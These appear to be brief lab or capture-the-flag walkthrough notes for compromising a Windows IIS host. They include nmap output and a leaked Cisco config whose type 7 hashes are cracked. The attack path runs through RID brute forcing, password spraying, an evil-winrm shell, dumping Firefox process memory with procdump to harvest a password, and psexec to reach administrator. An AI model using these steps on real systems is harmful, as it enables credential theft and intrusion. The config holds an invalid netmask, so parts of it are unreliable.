nmap:
```bash
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m37s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-04-18T11:59:37
|_  start_date: N/A
```
windows server running php

Website login as guest and check attachment
```bash
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
 ```
 
 cisco router type 7 can be decrypted
 rout3r:$uperP@ssword
 admin:```Q4)sJu\Y8qz*A3?d```
 seceret: stealth1agent
 
 smb login with hazard:stealth1agent
 
 RID brute force with lookupsid.py for usernames
 ```bash
 rout3r
 admin
 hazard
 support
 chance
 jason
```
now brute force with new users

winrm login with chase and ```Q4)sJu\Y8qz*A3?d```

use evilwinrm to get shell
some dir magic on windows:
```powershell
gci -recurse . | select fullname
```

Can dump process with sysinternals procdump64 -ma of firefox processes and find password for website
get new password for admin with winrm
```
administrator:4dD!5}x/re8]FBuZ
```
use psexec.py and root shell

```a8345179a73e5c95a7d25de9c87cfd30```